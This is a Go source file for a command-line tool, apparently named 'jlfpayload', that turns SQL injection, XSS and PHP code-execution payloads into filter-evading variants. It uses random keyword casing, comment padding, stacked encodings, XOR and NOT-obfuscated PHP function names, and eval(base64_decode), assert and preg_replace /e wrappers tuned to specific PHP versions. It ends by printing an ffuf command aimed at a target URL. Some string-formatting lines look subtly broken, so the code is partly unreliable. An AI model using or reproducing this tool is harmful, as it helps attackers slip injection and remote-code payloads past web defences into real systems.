package main

import (
	"bufio"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	DeveloperName = "jakeloai+AI"
	Version       = "1.0.1"
)

var rng = rand.New(rand.NewSource(time.Now().UnixNano()))

var sqlKeywords = []string{
	"select", "union", "insert", "update", "delete", "drop", "create",
	"alter", "exec", "execute", "from", "where", "and", "or", "not",
	"null", "like", "limit", "order", "group", "having", "into",
	"load_file", "outfile", "dumpfile", "sleep", "benchmark",
}

var xssTags = []string{
	"script", "img", "svg", "iframe", "body", "input", "form",
	"video", "audio", "object", "embed", "frame", "frameset",
}

var xssEvents = []string{
	"onerror", "onload", "onclick", "onmouseover", "onfocus",
	"onblur", "onchange", "onsubmit", "onkeydown", "onkeypress",
	"onkeyup", "ondblclick", "onmousemove", "onmouseout", "onmouseup",
	"onmousedown", "onscroll", "onresize", "onselect", "onabort",
}

var phpFunctions = []string{
	"system", "exec", "shell_exec", "passthru", "proc_open",
	"popen", "eval", "assert", "base64_decode", "hex2bin",
	"file_get_contents", "file_put_contents", "fopen", "fwrite",
}

func randomCase(s string) string {
	result := make([]byte, len(s))
	for i := range s {
		if rng.Intn(2) == 0 {
			result[i] = byte(strings.ToUpper(string(s[i]))[0])
		} else {
			result[i] = byte(strings.ToLower(string(s[i]))[0])
		}
	}
	return string(result)
}

func xorBytes(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key
	}
	return result
}

func notBytes(data []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = ^data[i]
	}
	return result
}

// generateXORExpression creates PHP XOR dynamic string with assignment step
func generateXORExpression(s string, key byte) string {
	xorData := xorBytes([]byte(s), key)
	hexStr := hex.EncodeToString(xorData)
	return fmt.Sprintf("$_=(hex2bin(%q)^str_repeat(chr(%d),%d));", hexStr, key, len(s))
}

// generateNOTExpression creates PHP NOT dynamic string with assignment step
func generateNOTExpression(s string) string {
	notData := notBytes([]byte(s))
	hexStr := hex.EncodeToString(notData)
	return fmt.Sprintf("$_=(~hex2bin(%q));", hexStr)
}

func removeDuplicates(payloads []string) []string {
	seen := make(map[string]bool)
	unique := make([]string, 0)
	for _, p := range payloads {
		trimmed := strings.TrimSpace(p)
		if trimmed == "" {
			continue
		}
		if !seen[trimmed] {
			seen[trimmed] = true
			unique = append(unique, trimmed)
		}
	}
	return unique
}

func encodeURLEncode(s string) string {
	return url.QueryEscape(s)
}

func encodeDoubleURLEncode(s string) string {
	return url.QueryEscape(url.QueryEscape(s))
}

func encodeHex(s string) string {
	return hex.EncodeToString([]byte(s))
}

func encodeHexSlashX(s string) string {
	data := []byte(s)
	result := make([]string, len(data))
	for i, b := range data {
		result[i] = fmt.Sprintf("\x%02x", b)
	}
	return strings.Join(result, "")
}

func encodeHex0x(s string) string {
	data := []byte(s)
	result := make([]string, len(data))
	for i, b := range data {
		result[i] = fmt.Sprintf("0x%02x", b)
	}
	return strings.Join(result, "")
}

func encodeHTMLEntity(s string) string {
	result := make([]string, len(s))
	for i, c := range s {
		result[i] = fmt.Sprintf("&#%d;", c)
	}
	return strings.Join(result, "")
}

func encodeHTMLEntityHex(s string) string {
	result := make([]string, len(s))
	for i, c := range s {
		result[i] = fmt.Sprintf("&#x%x;", c)
	}
	return strings.Join(result, "")
}

func encodeUnicodeEscape(s string) string {
	result := make([]string, 0)
	for _, c := range s {
		if c <= 0xFF {
			result = append(result, fmt.Sprintf("\u00%02x", c))
		} else if c <= 0xFFFF {
			result = append(result, fmt.Sprintf("\u%04x", c))
		} else {
			result = append(result, string(c))
		}
	}
	return strings.Join(result, "")
}

func encodeBase64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func encodeBase64URLEncode(s string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(s))
	return url.QueryEscape(b64)
}

func mutateSQLCommentSpace(s string) string {
	result := strings.ReplaceAll(s, " ", "/**/")
	result2 := strings.ReplaceAll(s, " ", "+")
	return result + "\n" + result2
}

func mutateSQLKeywordCase(s string) string {
	result := s
	for _, keyword := range sqlKeywords {
		lowerKw := strings.ToLower(keyword)
		upperKw := strings.ToUpper(keyword)
		if strings.Contains(strings.ToLower(result), lowerKw) {
			re := strings.NewReplacer(
				lowerKw, randomCase(keyword),
				upperKw, randomCase(keyword),
			)
			result = re.Replace(result)
		}
	}
	return result
}

func mutateSQLMixed(s string) string {
	commented := strings.ReplaceAll(s, " ", "/**/")
	result := commented
	for _, keyword := range sqlKeywords {
		lowerKw := strings.ToLower(keyword)
		if strings.Contains(strings.ToLower(result), lowerKw) {
			idx := strings.Index(strings.ToLower(result), lowerKw)
			if idx >= 0 {
				before := result[:idx]
				after := result[idx+len(keyword):]
				result = before + randomCase(keyword) + after
			}
		}
	}
	return result
}

func mutateXSSTagCase(s string) string {
	result := s
	for _, tag := range xssTags {
		lowerTag := strings.ToLower(tag)
		upperTag := strings.ToUpper(tag)
		if strings.Contains(strings.ToLower(result), lowerTag) {
			re := strings.NewReplacer(
				lowerTag, randomCase(tag),
				upperTag, randomCase(tag),
			)
			result = re.Replace(result)
		}
	}
	return result
}

func mutateXSSEventCase(s string) string {
	result := s
	for _, event := range xssEvents {
		lowerEvent := strings.ToLower(event)
		upperEvent := strings.ToUpper(event)
		if strings.Contains(strings.ToLower(result), lowerEvent) {
			re := strings.NewReplacer(
				lowerEvent, randomCase(event),
				upperEvent, randomCase(event),
			)
			result = re.Replace(result)
		}
	}
	return result
}

func mutateXSSJavaScriptProtocol(s string) string {
	result := s
	if strings.Contains(strings.ToLower(result), "javascript:") {
		re := strings.NewReplacer(
			"javascript:", randomCase("javascript:")+":",
			"JAVASCRIPT:", randomCase("javascript:")+":",
			"Javascript:", randomCase("javascript:")+":",
		)
		result = re.Replace(result)
	}
	return result
}

func mutateXSSMixed(s string) string {
	result := mutateXSSTagCase(s)
	result = mutateXSSEventCase(result)
	result = mutateXSSJavaScriptProtocol(result)
	return result
}

// mutatePHPXOR generates XOR-based dynamic string with assignment step
func mutatePHPXOR(s string) string {
	result := s
	for _, fn := range phpFunctions {
		lowerFn := strings.ToLower(fn)
		if strings.Contains(strings.ToLower(result), lowerFn) {
			xorExpr := generateXORExpression(fn, 0x5A)
			idx := strings.Index(strings.ToLower(result), lowerFn)
			if idx >= 0 {
				before := result[:idx]
				after := result[idx+len(fn):]
				result = before + xorExpr + "$_" + after
				break
			}
		}
	}
	return result
}

// mutatePHPNot generates NOT-based dynamic string with assignment step
func mutatePHPNot(s string) string {
	result := s
	for _, fn := range phpFunctions {
		lowerFn := strings.ToLower(fn)
		if strings.Contains(strings.ToLower(result), lowerFn) {
			notExpr := generateNOTExpression(fn)
			idx := strings.Index(strings.ToLower(result), lowerFn)
			if idx >= 0 {
				before := result[:idx]
				after := result[idx+len(fn):]
				result = before + notExpr + "$_" + after
				break
			}
		}
	}
	return result
}

func mutatePHPBase64Eval(s string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(s))
	return fmt.Sprintf("eval(base64_decode(%q));", b64)
}

func mutatePHPAssertBase64(s string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(s))
	return fmt.Sprintf("@assert(base64_decode(%q));", b64)
}

// mutatePHPPregReplace generates preg_replace with callback for PHP 7+ compatibility
func mutatePHPPregReplace(s string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(s))
	return fmt.Sprintf("preg_replace_callback(%q, function($m){ return base64_decode(%q); }, %q);", "/.*/", b64, ".")
}

// mutatePHPEvalCreateFunction generates create_function wrapper for older PHP
func mutatePHPEvalCreateFunction(s string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(s))
	return fmt.Sprintf("$f=create_function(%q, base64_decode(%q)); $f();", "", b64)
}

func obfuscateGeneral(payload string) []string {
	variants := make([]string, 0)
	variants = append(variants, payload)
	variants = append(variants, encodeURLEncode(payload))
	variants = append(variants, encodeDoubleURLEncode(payload))
	variants = append(variants, encodeHex(payload))
	variants = append(variants, encodeHexSlashX(payload))
	variants = append(variants, encodeHex0x(payload))
	variants = append(variants, encodeHTMLEntity(payload))
	variants = append(variants, encodeHTMLEntityHex(payload))
	variants = append(variants, encodeUnicodeEscape(payload))
	variants = append(variants, encodeBase64(payload))
	variants = append(variants, encodeBase64URLEncode(payload))
	urlEncoded := encodeURLEncode(payload)
	variants = append(variants, encodeBase64(urlEncoded))
	return variants
}

func obfuscateSQL(payload string) []string {
	variants := obfuscateGeneral(payload)
	commentVariants := mutateSQLCommentSpace(payload)
	for _, v := range strings.Split(commentVariants, "\n") {
		if strings.TrimSpace(v) != "" {
			variants = append(variants, v)
		}
	}
	variants = append(variants, mutateSQLKeywordCase(payload))
	variants = append(variants, mutateSQLMixed(payload))
	sqlMutated := []string{
		mutateSQLKeywordCase(payload),
		mutateSQLMixed(payload),
	}
	for _, sm := range sqlMutated {
		variants = append(variants, encodeURLEncode(sm))
		variants = append(variants, encodeDoubleURLEncode(sm))
		variants = append(variants, encodeHexSlashX(sm))
		variants = append(variants, encodeBase64(sm))
	}
	return variants
}

func obfuscateXSS(payload string) []string {
	variants := obfuscateGeneral(payload)
	variants = append(variants, mutateXSSTagCase(payload))
	variants = append(variants, mutateXSSEventCase(payload))
	variants = append(variants, mutateXSSJavaScriptProtocol(payload))
	variants = append(variants, mutateXSSMixed(payload))
	xssMutated := []string{
		mutateXSSTagCase(payload),
		mutateXSSEventCase(payload),
		mutateXSSMixed(payload),
	}
	for _, xm := range xssMutated {
		variants = append(variants, encodeURLEncode(xm))
		variants = append(variants, encodeHTMLEntity(xm))
		variants = append(variants, encodeUnicodeEscape(xm))
		variants = append(variants, encodeBase64(xm))
	}
	return variants
}

// obfuscatePHP generates PHP-specific obfuscations
// phpVersion: "legacy" (PHP 5.x), "modern" (PHP 7.x), "latest" (PHP 8.x)
func obfuscatePHP(payload string, phpVersion string) []string {
	variants := obfuscateGeneral(payload)
	variants = append(variants, mutatePHPXOR(payload))
	variants = append(variants, mutatePHPNot(payload))
	variants = append(variants, mutatePHPBase64Eval(payload))
	variants = append(variants, mutatePHPAssertBase64(payload))

	// Version-specific mutations
	switch phpVersion {
	case "legacy":
		// PHP 5.x: preg_replace with /e modifier works
		b64 := base64.StdEncoding.EncodeToString([]byte(payload))
		variants = append(variants, fmt.Sprintf("preg_replace(%q,base64_decode(%q),%q);", "/.*/e", b64, "."))
		variants = append(variants, mutatePHPEvalCreateFunction(payload))
	case "modern":
		// PHP 7.x: preg_replace /e removed, use callback
		variants = append(variants, mutatePHPPregReplace(payload))
		variants = append(variants, mutatePHPEvalCreateFunction(payload))
	case "latest":
		// PHP 8.x: create_function removed, assert is expression-only
		variants = append(variants, mutatePHPPregReplace(payload))
		// No create_function, no assert with string
	}

	phpWrappers := []string{
		mutatePHPBase64Eval(payload),
		mutatePHPAssertBase64(payload),
	}
	for _, pw := range phpWrappers {
		variants = append(variants, encodeBase64(pw))
		variants = append(variants, encodeURLEncode(pw))
		variants = append(variants, encodeHexSlashX(pw))
	}
	return variants
}

func obfuscateAll(payload string, phpVersion string) []string {
	variants := make([]string, 0)
	variants = append(variants, obfuscateGeneral(payload)...)
	variants = append(variants, obfuscateSQL(payload)...)
	variants = append(variants, obfuscateXSS(payload)...)
	variants = append(variants, obfuscatePHP(payload, phpVersion)...)
	return variants
}

func readPayloadsFromFile(filepath string) ([]string, error) {
	file, err := os.Open(filepath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	payloads := make([]string, 0)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			payloads = append(payloads, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return payloads, nil
}

func writePayloadsToFile(filepath string, payloads []string) error {
	file, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer file.Close()
	writer := bufio.NewWriter(file)
	for _, payload := range payloads {
		_, err := writer.WriteString(payload + "\n")
		if err != nil {
			return err
		}
	}
	return writer.Flush()
}

func calculateMD5(filepath string) (string, error) {
	data, err := os.ReadFile(filepath)
	if err != nil {
		return "", err
	}
	hash := md5.Sum(data)
	return hex.EncodeToString(hash[:]), nil
}

func main() {
	rand.Seed(time.Now().UnixNano())

	payloadFlag := flag.String("p", "", "Single payload string to obfuscate")
	fileFlag := flag.String("f", "", "File path containing multi-line payloads")
	outputFlag := flag.String("o", "obfuscated_wordlist.txt", "Output file path")
	modeFlag := flag.String("m", "all", "Mode filter: sql, xss, php, general, all")
	phpVersionFlag := flag.String("phpv", "modern", "PHP version: legacy (5.x), modern (7.x), latest (8.x)")
	quietFlag := flag.Bool("q", false, "Quiet mode - suppress all output except errors")
	flag.Parse()

	if *payloadFlag == "" && *fileFlag == "" {
		fmt.Fprintln(os.Stderr, "[ERROR] Please provide either -p (single payload) or -f (file path)")
		fmt.Fprintln(os.Stderr, "Usage: jlfpayload -p \"<payload>\" -m <mode> -o <output>")
		fmt.Fprintln(os.Stderr, "       jlfpayload -f <file> -m <mode> -o <output>")
		os.Exit(1)
	}

	if *payloadFlag != "" && *fileFlag != "" {
		fmt.Fprintln(os.Stderr, "[ERROR] Please use either -p or -f, not both")
		os.Exit(1)
	}

	validModes := map[string]bool{"sql": true, "xss": true, "php": true, "general": true, "all": true}
	if !validModes[*modeFlag] {
		fmt.Fprintf(os.Stderr, "[ERROR] Invalid mode: %s. Valid modes: sql, xss, php, general, all\n", *modeFlag)
		os.Exit(1)
	}

	validPHPVersions := map[string]bool{"legacy": true, "modern": true, "latest": true}
	if !validPHPVersions[*phpVersionFlag] {
		fmt.Fprintf(os.Stderr, "[ERROR] Invalid PHP version: %s. Valid: legacy, modern, latest\n", *phpVersionFlag)
		os.Exit(1)
	}

	var inputPayloads []string
	var source string

	if *payloadFlag != "" {
		inputPayloads = []string{*payloadFlag}
		source = "command line"
	} else {
		payloads, err := readPayloadsFromFile(*fileFlag)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[ERROR] Failed to read file %s: %v\n", *fileFlag, err)
			os.Exit(1)
		}
		inputPayloads = payloads
		source = *fileFlag
	}

	if !*quietFlag {
		fmt.Printf("[INFO] Loaded %d payload(s) from %s\n", len(inputPayloads), source)
		fmt.Printf("[INFO] Mode: %s | Output: %s\n", *modeFlag, *outputFlag)
		if *modeFlag == "php" || *modeFlag == "all" {
			fmt.Printf("[INFO] PHP Version target: %s\n", *phpVersionFlag)
		}
		fmt.Println("[INFO] Generating obfuscated variants...")
	}

	allVariants := make([]string, 0)
	for _, payload := range inputPayloads {
		var variants []string
		switch *modeFlag {
		case "sql":
			variants = obfuscateSQL(payload)
		case "xss":
			variants = obfuscateXSS(payload)
		case "php":
			variants = obfuscatePHP(payload, *phpVersionFlag)
		case "general":
			variants = obfuscateGeneral(payload)
		case "all":
			variants = obfuscateAll(payload, *phpVersionFlag)
		}
		allVariants = append(allVariants, variants...)
	}

	uniqueVariants := removeDuplicates(allVariants)

	err := writePayloadsToFile(*outputFlag, uniqueVariants)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to write output file: %v\n", err)
		os.Exit(1)
	}

	md5Hash, err := calculateMD5(*outputFlag)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to calculate MD5: %v\n", err)
		os.Exit(1)
	}

	if !*quietFlag {
		fmt.Println("")
		fmt.Println("===============================================================")
		fmt.Println("                    GENERATION COMPLETE")
		fmt.Println("===============================================================")
		fmt.Printf("  Input Source:        %s\n", source)
		fmt.Printf("  Input Payloads:      %d\n", len(inputPayloads))
		fmt.Printf("  Total Variants:      %d\n", len(allVariants))
		fmt.Printf("  Unique Variants:     %d\n", len(uniqueVariants))
		fmt.Printf("  Duplicates Removed:  %d\n", len(allVariants)-len(uniqueVariants))
		fmt.Printf("  Output File:         %s\n", *outputFlag)
		fmt.Printf("  MD5 Audit Hash:      %s\n", md5Hash)
		fmt.Println("===============================================================")
		fmt.Println("")
		fmt.Println("[INFO] Use the generated wordlist with ffuf:")
		fmt.Printf("       ffuf -w %s -u https://target.com/FUZZ\n", *outputFlag)
		fmt.Println("")
	} else {
		// In quiet mode, only output essential info to stdout (not stderr)
		fmt.Printf("%d\n", len(uniqueVariants))
		fmt.Printf("%s\n", *outputFlag)
		fmt.Printf("%s\n", md5Hash)
	}
}
